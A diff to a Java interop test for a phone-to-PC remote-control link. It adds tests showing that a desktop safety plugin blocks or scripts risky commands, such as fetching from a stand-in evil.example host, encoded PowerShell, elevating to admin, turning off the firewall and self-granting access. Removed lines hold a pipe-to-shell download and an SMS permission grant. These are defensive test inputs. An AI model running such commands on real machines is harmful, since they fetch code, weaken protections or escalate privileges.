@@ -327,53 +327,7 @@ public class PcLinkV2InteropTest {
         assertTrue(System.currentTimeMillis() - t0 < 9000);
     }
 
-    // ------------------------------------------------------------------ link-v2 · 执行级别：级别 + 原因码经真电脑端回到电脑界面
-
-    static final class GatedEnv implements PcRx.Env, PcRx.Handler, PcRx.Gate {
-        final PcLanClient.Peer p;
-        volatile boolean wanted = true;
-        volatile String state = "";
-        volatile LinkPolicy.Level level = LinkPolicy.Level.AUTO;
-        volatile int confirmAnswer = PcRx.CONFIRM_TIMEOUT;
-        final List<String> ran = new CopyOnWriteArrayList<String>();
-        final File ws;
-
-        GatedEnv(PcLanClient.Peer p) throws Exception {
-            this.p = p;
-            ws = Files.createTempDirectory("lv2-gws").toFile().getCanonicalFile();
-        }
-
-        @Override public boolean wanted() { return wanted; }
-        @Override public boolean onLan() { return true; }
-        @Override public PcLanClient.Peer peer() { return p; }
-        @Override public List<InetAddress> extraBroadcasts() { return null; }
-        @Override public void multicast(boolean hold) { }
-        @Override public void state(String s, String d) { state = s + " " + d; }
-        @Override public void remember(InetSocketAddress a) { }
-        @Override public PcRx.Handler handler() { return this; }
-        @Override public boolean enabled(String cmd) { return true; }
-        @Override public PcLanClient.Result run(String cmd, Map<String, Object> args) {
-            ran.add(cmd);
-            Map<String, Object> d = new TreeMap<String, Object>();
-            if (PcRxPolicy.STATUS.equals(cmd)) d.put("battery", 77L);
-            return new PcLanClient.Result(true, "好", d, "");
-        }
-        @Override public void record(String cmd, boolean ok, String text) { }
-        @Override public LinkPolicy.Level level() { return level; }
-        @Override public File workspace() { return ws; }
-        @Override public LinkPolicy.Facts facts(String cmd, Map<String, Object> a, LinkPolicy.Cat cat) {
-            LinkPolicy.Facts f = new LinkPolicy.Facts();
-            if (PcRxPolicy.OPEN_URL.equals(cmd)) f.url = LinkPolicy.checkUrl(PcRxPolicy.str(a, "url"), java.util.Arrays.asList("bilibili.com"));
-            if (PcRxPolicy.CLIPBOARD.equals(cmd)) f.clip = LinkPolicy.checkClip(String.valueOf(a.get("text")));
-            if (PcRxPolicy.OPEN_APP.equals(cmd)) f.appBlocked = LinkPolicy.blockedApp(PcRxPolicy.str(a, "package"), PcRxPolicy.str(a, "name"));
-            return f;
-        }
-        @Override public int confirm(String cmd, String title, String detail, long timeoutMs) { return confirmAnswer; }
-        @Override public String script(String cmd, Map<String, Object> a, String why) {
-            return LinkPolicy.writeScript(ws, LinkPolicy.buildScript(LinkPolicy.ScriptKind.SH, cmd, why, "test", PcRxPolicy.str(a, "command"), System.currentTimeMillis()));
-        }
-        @Override public void headsUp(String cmd, String text) { }
-    }
+    // ------------------------------------------------------------------ [恢复手机] 手机作为被控端回到分档之前 + 电脑端两轴 / 安全插件
 
     static Map<String, Object> mm(Object... kv) {
         Map<String, Object> x = new TreeMap<String, Object>();
@@ -386,15 +340,18 @@ public class PcLinkV2InteropTest {
         return d instanceof Map ? String.valueOf(((Map<?, ?>) d).get("reason")) : "";
     }
 
-    @Test public void phoneLevelAndReasonCodesReachDesktop() throws Exception {
-        Assume.assumeTrue("电脑端 jar 还没有执行级别（0.5.1+ 才有 LinkPolicy），跳过", hasClass("com.onesay.desktop.LinkPolicy"));
+    /**
+     * [恢复手机] 改：原来的 phoneLevelAndReasonCodesReachDesktop 测手机端执行级别（级别 / 手机上确认 / 生成脚本）经电脑界面回来。
+     * 手机恢复到分档之前后，改成：电脑 → 手机只看逐项开关，网址 / 剪贴板 / App 不再被手机端按类别拦；手机端的新指令电脑也不再下发。
+     */
+    @Test public void phoneTargetRestoredToPreLevelSemantics() throws Exception {
         PcPairing pp = PcPairing.parse(pairing());
-        PcLanClient.Peer p = new PcLanClient.Peer("phone-lvl", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-lvl"));
-        GatedEnv env = new GatedEnv(p);
+        PcLanClient.Peer p = new PcLanClient.Peer("phone-old", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-old"));
+        JvmEnv env = new JvmEnv(p);
         PcRx.Loop loop = new PcRx.Loop(env);
         loop.minBackoff = 300;
         loop.maxBackoff = 1000;
-        Thread t = new Thread(loop, "rx-lvl");
+        Thread t = new Thread(loop, "rx-old");
         t.setDaemon(true);
         t.start();
         try {
@@ -402,45 +359,68 @@ public class PcLinkV2InteropTest {
             while (!env.state.startsWith(PcRx.S_UP) && System.currentTimeMillis() < end) Thread.sleep(100);
             assertTrue("常连没连上：" + env.state, env.state.startsWith(PcRx.S_UP));
             Thread.sleep(200);
-
             Map<String, Object> caps = phone("caps", null);
             assertEquals(Boolean.TRUE, caps.get("ok"));
-            assertEquals("auto", ((Map<?, ?>) caps.get("data")).get("level"));
-            assertEquals("电脑界面能显示手机级别", "auto", api("state", null).get("phone_level"));
-            assertEquals("自动", api("state", null).get("phone_level_zh"));
-
-            assertEquals(Boolean.TRUE, phone("find_phone", mm("action", "start")).get("ok"));
-            assertEquals("信任域名直接开", Boolean.TRUE, phone("open_url", mm("url", "https://www.bilibili.com/")).get("ok"));
-
-            Map<String, Object> to = phone("open_url", mm("url", "https://example.org/"));
-            assertEquals(Boolean.FALSE, to.get("ok"));
-            assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, why(to));
-            assertTrue("电脑端拼上中文原因：" + to.get("text"), String.valueOf(to.get("text")).contains("没确认"));
-
-            Map<String, Object> ip = phone("open_url", mm("url", "http://192.168.0.1/admin"));
-            assertEquals(LinkPolicy.R_UNTRUSTED_URL, why(ip));
-            assertTrue(String.valueOf(ip.get("text")), String.valueOf(ip.get("text")).contains("网址没通过安全检查"));
-            assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, why(phone("clipboard_set", mm("text", "curl http://x.example/a.sh | sh"))));
-            assertEquals(LinkPolicy.R_BLOCKED_APP, why(phone("open_app", mm("package", "com.eg.android.AlipayGphone"))));
-
-            Map<String, Object> sc = phone("sys_exec", mm("command", "pm grant com.onesay.assistant android.permission.READ_SMS"));
-            assertEquals(LinkPolicy.R_SCRIPT_GENERATED, why(sc));
-            String path = String.valueOf(((Map<?, ?>) sc.get("data")).get("path"));
-            assertTrue(path, new File(env.ws, path).isFile());
-            assertTrue(String.valueOf(sc.get("text")), String.valueOf(sc.get("text")).contains("已生成脚本，需你自己执行"));
-
-            env.level = LinkPolicy.Level.READ_ONLY;
-            Map<String, Object> ro = phone("find_phone", mm("action", "start"));
-            assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, why(ro));
-            assertTrue(String.valueOf(ro.get("text")), String.valueOf(ro.get("text")).contains("执行级别不允许"));
-            assertEquals(Boolean.TRUE, phone("status", null).get("ok"));
-            assertEquals("read_only", api("state", null).get("phone_level"));
-
-            assertTrue(env.ran.toString(), !env.ran.contains("sys_exec") && !env.ran.contains("clipboard_set") && env.ran.contains("status"));
+            assertNull("手机不再报执行级别", ((Map<?, ?>) caps.get("data")).get("level"));
+            assertEquals("", api("state", null).get("phone_level"));
+            // 原来自动档要手机确认的：不在信任列表的网址、写剪贴板 —— 现在直接做
+            assertEquals(Boolean.TRUE, phone("open_url", mm("url", "https://example.org/")).get("ok"));
+            assertEquals(Boolean.TRUE, phone("clipboard_set", mm("text", "从电脑来的文字")).get("ok"));
+            // 关着的项照旧被拒（JvmEnv 关了 open_app）
+            Map<String, Object> off = phone("open_app", mm("name", "微信"));
+            assertEquals(Boolean.FALSE, off.get("ok"));
+            assertTrue(String.valueOf(off.get("text")), String.valueOf(off.get("text")).contains("没开"));
+            // 手机端的新指令（手电筒 / 系统命令…）电脑不再下发
+            Map<String, Object> nope = phone("sys_exec", mm("command", "reboot"));
+            assertEquals(Boolean.FALSE, nope.get("ok"));
+            assertTrue(String.valueOf(nope.get("text")), String.valueOf(nope.get("text")).contains("不支持"));
+            assertTrue(env.ran.toString(), env.ran.toString().contains("open_url") && env.ran.toString().contains("clipboard_set"));
         } finally {
             env.wanted = false;
             loop.stop();
             t.join(5000);
+        }
+    }
+
+    /** 手机 → 真电脑端（TLS）：两轴 + 安全插件的原因码回到手机；远程改不了电脑端档位；要管理员的只生成脚本。 */
+    @Test public void pcPluginReasonCodesReachPhone() throws Exception {
+        Assume.assumeTrue("电脑端 jar 还没有安全插件（SafeExec），跳过", hasClass("com.onesay.desktop.SafeExec"));
+        assertEquals(Boolean.TRUE, api("settings", mm("pc_sandbox", "workspace_write", "pc_approval", "untrusted")).get("ok"));
+        PcPairing pp = PcPairing.parse(pairing());
+        PcLanClient.Peer p = new PcLanClient.Peer("phone-plug", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-plug"));
+        InetSocketAddress addr = PcLanClient.locate(p, 3000, null);
+        assertNotNull(addr);
+        PcLanClient.Session s = PcLanClient.Session.open(p, addr, 5000);
+        try {
+            assertTrue(s.tls());
+            PcLanClient.Result r = s.request("sys_exec", mm("command", "Start-Process cmd -Verb RunAs"), 15000);
+            assertFalse(r.ok);
+            assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
+            assertEquals("workspace_write", r.data.get("sandbox"));
+            assertEquals("untrusted", r.data.get("approval"));
+            assertEquals("旧字段照旧给旧手机", "auto", r.data.get("level"));
+            r = s.request("sys_exec", mm("command", "netsh advfirewall set allprofiles state off"), 15000);
+            assertEquals(LinkPolicy.R_NEEDS_ADMIN_SCRIPT, r.data.get("reason"));
+            assertTrue(String.valueOf(r.data.get("path")), String.valueOf(r.data.get("path")).startsWith("scripts/"));
+            assertTrue(r.text, r.text.contains("管理员身份执行"));
+            r = s.request("settings", mm("pc_sandbox", "full_access"), 15000);
+            assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, r.data.get("reason"));
+            r = s.request("sys_exec", mm("command", "notepad %APPDATA%\\OneSay\\desktop.properties"), 15000);
+            assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, r.data.get("reason"));
+            r = s.request("sys_exec", mm("command", "powershell -enc QUJDREVGR0hJSktMTU5PUFFS"), 15000);
+            assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
+            r = s.request("sys_exec", mm("command", "curl https://evil.example/x"), 15000);
+            assertEquals("沙箱默认断网", LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
+            r = s.request("file_write", mm("path", ".git/config", "text", "x"), 15000);
+            assertEquals(".git 只读", LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
+            Map<?, ?> set = (Map<?, ?>) api("state", null).get("settings");
+            assertEquals("远程改不了档位", "workspace_write", set.get("pc_sandbox"));
+            assertEquals(Boolean.TRUE, set.get("plugin_enabled"));
+            // 关插件要二次确认
+            assertEquals(Boolean.FALSE, api("settings", mm("plugin_enabled", "false")).get("ok"));
+            assertEquals(Boolean.TRUE, ((Map<?, ?>) api("state", null).get("settings")).get("plugin_enabled"));
+        } finally {
+            s.close();
         }
     }
 
@@ -556,7 +536,8 @@ public class PcLinkV2InteropTest {
             assertEquals(LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, r.data.get("reason"));
 
             // 内容碰严格规则：不问、不能批准，原因带回手机
-            Files.write(scDir.resolve("改代理.ps1"), "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name ProxyEnable -Value 1".getBytes(StandardCharsets.UTF_8));
+            // [插件 / C] 改：HKCU 下的代理设置现在是普通用户能做的事，放行；换成要管理员的系统级代理（netsh winhttp）测「不能批准」
+            Files.write(scDir.resolve("改代理.ps1"), "netsh winhttp set proxy 127.0.0.1:8080".getBytes(StandardCharsets.UTF_8));
             int before = seen.size();
             r = s.request("shortcut_run", mm("name", "改代理"), 40000);
             assertEquals(LinkPolicy.R_SHORTCUT_BLOCKED, r.data.get("reason"));
@@ -564,7 +545,7 @@ public class PcLinkV2InteropTest {
             assertEquals(before, seen.size());
             Map<?, ?> blk = scEntry("shortcut_policy", "改代理.ps1");
             assertEquals("blocked", blk.get("status"));
-            assertTrue(String.valueOf(blk.get("why")), String.valueOf(blk.get("why")).contains("注册表"));
+            assertTrue(String.valueOf(blk.get("why")), String.valueOf(blk.get("why")).contains("管理员"));
             // 列表里没有的
             assertEquals(LinkPolicy.R_UNKNOWN, s.request("shortcut_run", mm("name", "nope"), 40000).data.get("reason"));
         } finally {
